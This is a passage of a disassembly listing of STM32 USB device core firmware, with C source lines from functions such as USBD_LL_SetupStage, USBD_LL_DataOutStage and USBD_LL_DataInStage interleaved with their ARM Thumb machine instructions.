  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800af16:	6878      	ldr	r0, [r7, #4]
 800af18:	f001 fdca 	bl	800cab0 <USBD_LL_Start>
 800af1c:	4603      	mov	r3, r0
}
 800af1e:	4618      	mov	r0, r3
 800af20:	3708      	adds	r7, #8
 800af22:	46bd      	mov	sp, r7
 800af24:	bd80      	pop	{r7, pc}

0800af26 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800af26:	b480      	push	{r7}
 800af28:	b083      	sub	sp, #12
 800af2a:	af00      	add	r7, sp, #0
 800af2c:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af2e:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af30:	4618      	mov	r0, r3
 800af32:	370c      	adds	r7, #12
 800af34:	46bd      	mov	sp, r7
 800af36:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af3a:	4770      	bx	lr

0800af3c <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af3c:	b580      	push	{r7, lr}
 800af3e:	b084      	sub	sp, #16
 800af40:	af00      	add	r7, sp, #0
 800af42:	6078      	str	r0, [r7, #4]
 800af44:	460b      	mov	r3, r1
 800af46:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af48:	2300      	movs	r3, #0
 800af4a:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800af4c:	687b      	ldr	r3, [r7, #4]
 800af4e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af52:	2b00      	cmp	r3, #0
 800af54:	d009      	beq.n	800af6a <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800af56:	687b      	ldr	r3, [r7, #4]
 800af58:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af5c:	681b      	ldr	r3, [r3, #0]
 800af5e:	78fa      	ldrb	r2, [r7, #3]
 800af60:	4611      	mov	r1, r2
 800af62:	6878      	ldr	r0, [r7, #4]
 800af64:	4798      	blx	r3
 800af66:	4603      	mov	r3, r0
 800af68:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af6a:	7bfb      	ldrb	r3, [r7, #15]
}
 800af6c:	4618      	mov	r0, r3
 800af6e:	3710      	adds	r7, #16
 800af70:	46bd      	mov	sp, r7
 800af72:	bd80      	pop	{r7, pc}

0800af74 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af74:	b580      	push	{r7, lr}
 800af76:	b084      	sub	sp, #16
 800af78:	af00      	add	r7, sp, #0
 800af7a:	6078      	str	r0, [r7, #4]
 800af7c:	460b      	mov	r3, r1
 800af7e:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af80:	2300      	movs	r3, #0
 800af82:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800af84:	687b      	ldr	r3, [r7, #4]
 800af86:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af8a:	685b      	ldr	r3, [r3, #4]
 800af8c:	78fa      	ldrb	r2, [r7, #3]
 800af8e:	4611      	mov	r1, r2
 800af90:	6878      	ldr	r0, [r7, #4]
 800af92:	4798      	blx	r3
 800af94:	4603      	mov	r3, r0
 800af96:	2b00      	cmp	r3, #0
 800af98:	d001      	beq.n	800af9e <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800af9a:	2303      	movs	r3, #3
 800af9c:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af9e:	7bfb      	ldrb	r3, [r7, #15]
}
 800afa0:	4618      	mov	r0, r3
 800afa2:	3710      	adds	r7, #16
 800afa4:	46bd      	mov	sp, r7
 800afa6:	bd80      	pop	{r7, pc}

0800afa8 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800afa8:	b580      	push	{r7, lr}
 800afaa:	b084      	sub	sp, #16
 800afac:	af00      	add	r7, sp, #0
 800afae:	6078      	str	r0, [r7, #4]
 800afb0:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800afb2:	687b      	ldr	r3, [r7, #4]
 800afb4:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afb8:	6839      	ldr	r1, [r7, #0]
 800afba:	4618      	mov	r0, r3
 800afbc:	f001 f8a7 	bl	800c10e <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800afc0:	687b      	ldr	r3, [r7, #4]
 800afc2:	2201      	movs	r2, #1
 800afc4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800afc8:	687b      	ldr	r3, [r7, #4]
 800afca:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800afce:	461a      	mov	r2, r3
 800afd0:	687b      	ldr	r3, [r7, #4]
 800afd2:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800afd6:	687b      	ldr	r3, [r7, #4]
 800afd8:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800afdc:	f003 031f 	and.w	r3, r3, #31
 800afe0:	2b02      	cmp	r3, #2
 800afe2:	d01a      	beq.n	800b01a <USBD_LL_SetupStage+0x72>
 800afe4:	2b02      	cmp	r3, #2
 800afe6:	d822      	bhi.n	800b02e <USBD_LL_SetupStage+0x86>
 800afe8:	2b00      	cmp	r3, #0
 800afea:	d002      	beq.n	800aff2 <USBD_LL_SetupStage+0x4a>
 800afec:	2b01      	cmp	r3, #1
 800afee:	d00a      	beq.n	800b006 <USBD_LL_SetupStage+0x5e>
 800aff0:	e01d      	b.n	800b02e <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800aff2:	687b      	ldr	r3, [r7, #4]
 800aff4:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800aff8:	4619      	mov	r1, r3
 800affa:	6878      	ldr	r0, [r7, #4]
 800affc:	f000 fad4 	bl	800b5a8 <USBD_StdDevReq>
 800b000:	4603      	mov	r3, r0
 800b002:	73fb      	strb	r3, [r7, #15]
      break;
 800b004:	e020      	b.n	800b048 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b006:	687b      	ldr	r3, [r7, #4]
 800b008:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b00c:	4619      	mov	r1, r3
 800b00e:	6878      	ldr	r0, [r7, #4]
 800b010:	f000 fb3c 	bl	800b68c <USBD_StdItfReq>
 800b014:	4603      	mov	r3, r0
 800b016:	73fb      	strb	r3, [r7, #15]
      break;
 800b018:	e016      	b.n	800b048 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b01a:	687b      	ldr	r3, [r7, #4]
 800b01c:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b020:	4619      	mov	r1, r3
 800b022:	6878      	ldr	r0, [r7, #4]
 800b024:	f000 fb9e 	bl	800b764 <USBD_StdEPReq>
 800b028:	4603      	mov	r3, r0
 800b02a:	73fb      	strb	r3, [r7, #15]
      break;
 800b02c:	e00c      	b.n	800b048 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b02e:	687b      	ldr	r3, [r7, #4]
 800b030:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b034:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b038:	b2db      	uxtb	r3, r3
 800b03a:	4619      	mov	r1, r3
 800b03c:	6878      	ldr	r0, [r7, #4]
 800b03e:	f001 fe13 	bl	800cc68 <USBD_LL_StallEP>
 800b042:	4603      	mov	r3, r0
 800b044:	73fb      	strb	r3, [r7, #15]
      break;
 800b046:	bf00      	nop
  }

  return ret;
 800b048:	7bfb      	ldrb	r3, [r7, #15]
}
 800b04a:	4618      	mov	r0, r3
 800b04c:	3710      	adds	r7, #16
 800b04e:	46bd      	mov	sp, r7
 800b050:	bd80      	pop	{r7, pc}

0800b052 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b052:	b580      	push	{r7, lr}
 800b054:	b086      	sub	sp, #24
 800b056:	af00      	add	r7, sp, #0
 800b058:	60f8      	str	r0, [r7, #12]
 800b05a:	460b      	mov	r3, r1
 800b05c:	607a      	str	r2, [r7, #4]
 800b05e:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b060:	2300      	movs	r3, #0
 800b062:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b064:	7afb      	ldrb	r3, [r7, #11]
 800b066:	2b00      	cmp	r3, #0
 800b068:	d16e      	bne.n	800b148 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b06a:	68fb      	ldr	r3, [r7, #12]
 800b06c:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b070:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b072:	68fb      	ldr	r3, [r7, #12]
 800b074:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b078:	2b03      	cmp	r3, #3
 800b07a:	f040 8098 	bne.w	800b1ae <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b07e:	693b      	ldr	r3, [r7, #16]
 800b080:	689a      	ldr	r2, [r3, #8]
 800b082:	693b      	ldr	r3, [r7, #16]
 800b084:	68db      	ldr	r3, [r3, #12]
 800b086:	429a      	cmp	r2, r3
 800b088:	d913      	bls.n	800b0b2 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b08a:	693b      	ldr	r3, [r7, #16]
 800b08c:	689a      	ldr	r2, [r3, #8]
 800b08e:	693b      	ldr	r3, [r7, #16]
 800b090:	68db      	ldr	r3, [r3, #12]
 800b092:	1ad2      	subs	r2, r2, r3
 800b094:	693b      	ldr	r3, [r7, #16]
 800b096:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b098:	693b      	ldr	r3, [r7, #16]
 800b09a:	68da      	ldr	r2, [r3, #12]
 800b09c:	693b      	ldr	r3, [r7, #16]
 800b09e:	689b      	ldr	r3, [r3, #8]
 800b0a0:	4293      	cmp	r3, r2
 800b0a2:	bf28      	it	cs
 800b0a4:	4613      	movcs	r3, r2
 800b0a6:	461a      	mov	r2, r3
 800b0a8:	6879      	ldr	r1, [r7, #4]
 800b0aa:	68f8      	ldr	r0, [r7, #12]
 800b0ac:	f001 f923 	bl	800c2f6 <USBD_CtlContinueRx>
 800b0b0:	e07d      	b.n	800b1ae <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b0b2:	68fb      	ldr	r3, [r7, #12]
 800b0b4:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b0b8:	f003 031f 	and.w	r3, r3, #31
 800b0bc:	2b02      	cmp	r3, #2
 800b0be:	d014      	beq.n	800b0ea <USBD_LL_DataOutStage+0x98>
 800b0c0:	2b02      	cmp	r3, #2
 800b0c2:	d81d      	bhi.n	800b100 <USBD_LL_DataOutStage+0xae>
 800b0c4:	2b00      	cmp	r3, #0
 800b0c6:	d002      	beq.n	800b0ce <USBD_LL_DataOutStage+0x7c>
 800b0c8:	2b01      	cmp	r3, #1
 800b0ca:	d003      	beq.n	800b0d4 <USBD_LL_DataOutStage+0x82>
 800b0cc:	e018      	b.n	800b100 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b0ce:	2300      	movs	r3, #0
 800b0d0:	75bb      	strb	r3, [r7, #22]
            break;
 800b0d2:	e018      	b.n	800b106 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b0d4:	68fb      	ldr	r3, [r7, #12]
 800b0d6:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0da:	b2db      	uxtb	r3, r3
 800b0dc:	4619      	mov	r1, r3
 800b0de:	68f8      	ldr	r0, [r7, #12]
 800b0e0:	f000 f9d2 	bl	800b488 <USBD_CoreFindIF>
 800b0e4:	4603      	mov	r3, r0
 800b0e6:	75bb      	strb	r3, [r7, #22]
            break;
 800b0e8:	e00d      	b.n	800b106 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b0ea:	68fb      	ldr	r3, [r7, #12]
 800b0ec:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0f0:	b2db      	uxtb	r3, r3
 800b0f2:	4619      	mov	r1, r3
 800b0f4:	68f8      	ldr	r0, [r7, #12]
 800b0f6:	f000 f9d4 	bl	800b4a2 <USBD_CoreFindEP>
 800b0fa:	4603      	mov	r3, r0
 800b0fc:	75bb      	strb	r3, [r7, #22]
            break;
 800b0fe:	e002      	b.n	800b106 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b100:	2300      	movs	r3, #0
 800b102:	75bb      	strb	r3, [r7, #22]
            break;
 800b104:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b106:	7dbb      	ldrb	r3, [r7, #22]
 800b108:	2b00      	cmp	r3, #0
 800b10a:	d119      	bne.n	800b140 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b10c:	68fb      	ldr	r3, [r7, #12]
 800b10e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b112:	b2db      	uxtb	r3, r3
 800b114:	2b03      	cmp	r3, #3
 800b116:	d113      	bne.n	800b140 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b118:	7dba      	ldrb	r2, [r7, #22]
 800b11a:	68fb      	ldr	r3, [r7, #12]
 800b11c:	32ae      	adds	r2, #174	; 0xae
 800b11e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b122:	691b      	ldr	r3, [r3, #16]
 800b124:	2b00      	cmp	r3, #0
 800b126:	d00b      	beq.n	800b140 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b128:	7dba      	ldrb	r2, [r7, #22]
 800b12a:	68fb      	ldr	r3, [r7, #12]
 800b12c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b130:	7dba      	ldrb	r2, [r7, #22]
 800b132:	68fb      	ldr	r3, [r7, #12]
 800b134:	32ae      	adds	r2, #174	; 0xae
 800b136:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b13a:	691b      	ldr	r3, [r3, #16]
 800b13c:	68f8      	ldr	r0, [r7, #12]
 800b13e:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b140:	68f8      	ldr	r0, [r7, #12]
 800b142:	f001 f8e9 	bl	800c318 <USBD_CtlSendStatus>
 800b146:	e032      	b.n	800b1ae <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b148:	7afb      	ldrb	r3, [r7, #11]
 800b14a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b14e:	b2db      	uxtb	r3, r3
 800b150:	4619      	mov	r1, r3
 800b152:	68f8      	ldr	r0, [r7, #12]
 800b154:	f000 f9a5 	bl	800b4a2 <USBD_CoreFindEP>
 800b158:	4603      	mov	r3, r0
 800b15a:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b15c:	7dbb      	ldrb	r3, [r7, #22]
 800b15e:	2bff      	cmp	r3, #255	; 0xff
 800b160:	d025      	beq.n	800b1ae <USBD_LL_DataOutStage+0x15c>
 800b162:	7dbb      	ldrb	r3, [r7, #22]
 800b164:	2b00      	cmp	r3, #0
 800b166:	d122      	bne.n	800b1ae <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b168:	68fb      	ldr	r3, [r7, #12]
 800b16a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b16e:	b2db      	uxtb	r3, r3
 800b170:	2b03      	cmp	r3, #3
 800b172:	d117      	bne.n	800b1a4 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b174:	7dba      	ldrb	r2, [r7, #22]
 800b176:	68fb      	ldr	r3, [r7, #12]
 800b178:	32ae      	adds	r2, #174	; 0xae
 800b17a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b17e:	699b      	ldr	r3, [r3, #24]
 800b180:	2b00      	cmp	r3, #0
 800b182:	d00f      	beq.n	800b1a4 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b184:	7dba      	ldrb	r2, [r7, #22]
 800b186:	68fb      	ldr	r3, [r7, #12]
 800b188:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b18c:	7dba      	ldrb	r2, [r7, #22]
 800b18e:	68fb      	ldr	r3, [r7, #12]
 800b190:	32ae      	adds	r2, #174	; 0xae
 800b192:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b196:	699b      	ldr	r3, [r3, #24]
 800b198:	7afa      	ldrb	r2, [r7, #11]
 800b19a:	4611      	mov	r1, r2
 800b19c:	68f8      	ldr	r0, [r7, #12]
 800b19e:	4798      	blx	r3
 800b1a0:	4603      	mov	r3, r0
 800b1a2:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b1a4:	7dfb      	ldrb	r3, [r7, #23]
 800b1a6:	2b00      	cmp	r3, #0
 800b1a8:	d001      	beq.n	800b1ae <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b1aa:	7dfb      	ldrb	r3, [r7, #23]
 800b1ac:	e000      	b.n	800b1b0 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b1ae:	2300      	movs	r3, #0
}
 800b1b0:	4618      	mov	r0, r3
 800b1b2:	3718      	adds	r7, #24
 800b1b4:	46bd      	mov	sp, r7
 800b1b6:	bd80      	pop	{r7, pc}

0800b1b8 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b1b8:	b580      	push	{r7, lr}
 800b1ba:	b086      	sub	sp, #24
 800b1bc:	af00      	add	r7, sp, #0
 800b1be:	60f8      	str	r0, [r7, #12]
 800b1c0:	460b      	mov	r3, r1
 800b1c2:	607a      	str	r2, [r7, #4]
 800b1c4:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b1c6:	7afb      	ldrb	r3, [r7, #11]
 800b1c8:	2b00      	cmp	r3, #0
 800b1ca:	d16f      	bne.n	800b2ac <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b1cc:	68fb      	ldr	r3, [r7, #12]
 800b1ce:	3314      	adds	r3, #20
 800b1d0:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b1d2:	68fb      	ldr	r3, [r7, #12]
 800b1d4:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b1d8:	2b02      	cmp	r3, #2
 800b1da:	d15a      	bne.n	800b292 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b1dc:	693b      	ldr	r3, [r7, #16]
 800b1de:	689a      	ldr	r2, [r3, #8]
 800b1e0:	693b      	ldr	r3, [r7, #16]
 800b1e2:	68db      	ldr	r3, [r3, #12]
 800b1e4:	429a      	cmp	r2, r3
 800b1e6:	d914      	bls.n	800b212 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b1e8:	693b      	ldr	r3, [r7, #16]
 800b1ea:	689a      	ldr	r2, [r3, #8]
 800b1ec:	693b      	ldr	r3, [r7, #16]
 800b1ee:	68db      	ldr	r3, [r3, #12]
 800b1f0:	1ad2      	subs	r2, r2, r3
 800b1f2:	693b      	ldr	r3, [r7, #16]
 800b1f4:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b1f6:	693b      	ldr	r3, [r7, #16]
 800b1f8:	689b      	ldr	r3, [r3, #8]
 800b1fa:	461a      	mov	r2, r3
 800b1fc:	6879      	ldr	r1, [r7, #4]
 800b1fe:	68f8      	ldr	r0, [r7, #12]
 800b200:	f001 f84b 	bl	800c29a <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b204:	2300      	movs	r3, #0
 800b206:	2200      	movs	r2, #0
 800b208:	2100      	movs	r1, #0
 800b20a:	68f8      	ldr	r0, [r7, #12]
 800b20c:	f001 fe34 	bl	800ce78 <USBD_LL_PrepareReceive>
 800b210:	e03f      	b.n	800b292 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b212:	693b      	ldr	r3, [r7, #16]
 800b214:	68da      	ldr	r2, [r3, #12]
 800b216:	693b      	ldr	r3, [r7, #16]
 800b218:	689b      	ldr	r3, [r3, #8]
 800b21a:	429a      	cmp	r2, r3
 800b21c:	d11c      	bne.n	800b258 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b21e:	693b      	ldr	r3, [r7, #16]
 800b220:	685a      	ldr	r2, [r3, #4]
 800b222:	693b      	ldr	r3, [r7, #16]
 800b224:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b226:	429a      	cmp	r2, r3
 800b228:	d316      	bcc.n	800b258 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b22a:	693b      	ldr	r3, [r7, #16]
 800b22c:	685a      	ldr	r2, [r3, #4]
 800b22e:	68fb      	ldr	r3, [r7, #12]
 800b230:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b234:	429a      	cmp	r2, r3
 800b236:	d20f      	bcs.n	800b258 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b238:	2200      	movs	r2, #0
 800b23a:	2100      	movs	r1, #0
 800b23c:	68f8      	ldr	r0, [r7, #12]
 800b23e:	f001 f82c 	bl	800c29a <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b242:	68fb      	ldr	r3, [r7, #12]
 800b244:	2200      	movs	r2, #0
 800b246:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b24a:	2300      	movs	r3, #0
 800b24c:	2200      	movs	r2, #0
 800b24e:	2100      	movs	r1, #0
 800b250:	68f8      	ldr	r0, [r7, #12]
 800b252:	f001 fe11 	bl	800ce78 <USBD_LL_PrepareReceive>
 800b256:	e01c      	b.n	800b292 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b258:	68fb      	ldr	r3, [r7, #12]
 800b25a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b25e:	b2db      	uxtb	r3, r3
 800b260:	2b03      	cmp	r3, #3
 800b262:	d10f      	bne.n	800b284 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b264:	68fb      	ldr	r3, [r7, #12]
 800b266:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b26a:	68db      	ldr	r3, [r3, #12]
 800b26c:	2b00      	cmp	r3, #0
 800b26e:	d009      	beq.n	800b284 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b270:	68fb      	ldr	r3, [r7, #12]
 800b272:	2200      	movs	r2, #0
 800b274:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b278:	68fb      	ldr	r3, [r7, #12]
 800b27a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b27e:	68db      	ldr	r3, [r3, #12]
 800b280:	68f8      	ldr	r0, [r7, #12]
 800b282:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b284:	2180      	movs	r1, #128	; 0x80
 800b286:	68f8      	ldr	r0, [r7, #12]
 800b288:	f001 fcee 	bl	800cc68 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b28c:	68f8      	ldr	r0, [r7, #12]
 800b28e:	f001 f856 	bl	800c33e <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b292:	68fb      	ldr	r3, [r7, #12]
 800b294:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b298:	2b00      	cmp	r3, #0
 800b29a:	d03a      	beq.n	800b312 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b29c:	68f8      	ldr	r0, [r7, #12]
 800b29e:	f7ff fe42 	bl	800af26 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b2a2:	68fb      	ldr	r3, [r7, #12]
 800b2a4:	2200      	movs	r2, #0
 800b2a6:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b2aa:	e032      	b.n	800b312 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b2ac:	7afb      	ldrb	r3, [r7, #11]
 800b2ae:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b2b2:	b2db      	uxtb	r3, r3
 800b2b4:	4619      	mov	r1, r3
 800b2b6:	68f8      	ldr	r0, [r7, #12]
 800b2b8:	f000 f8f3 	bl	800b4a2 <USBD_CoreFindEP>
 800b2bc:	4603      	mov	r3, r0
 800b2be:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b2c0:	7dfb      	ldrb	r3, [r7, #23]
 800b2c2:	2bff      	cmp	r3, #255	; 0xff
 800b2c4:	d025      	beq.n	800b312 <USBD_LL_DataInStage+0x15a>
 800b2c6:	7dfb      	ldrb	r3, [r7, #23]
 800b2c8:	2b00      	cmp	r3, #0
 800b2ca:	d122      	bne.n	800b312 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2cc:	68fb      	ldr	r3, [r7, #12]
 800b2ce:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2d2:	b2db      	uxtb	r3, r3
 800b2d4:	2b03      	cmp	r3, #3
 800b2d6:	d11c      	bne.n	800b312 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b2d8:	7dfa      	ldrb	r2, [r7, #23]
 800b2da:	68fb      	ldr	r3, [r7, #12]
 800b2dc:	32ae      	adds	r2, #174	; 0xae
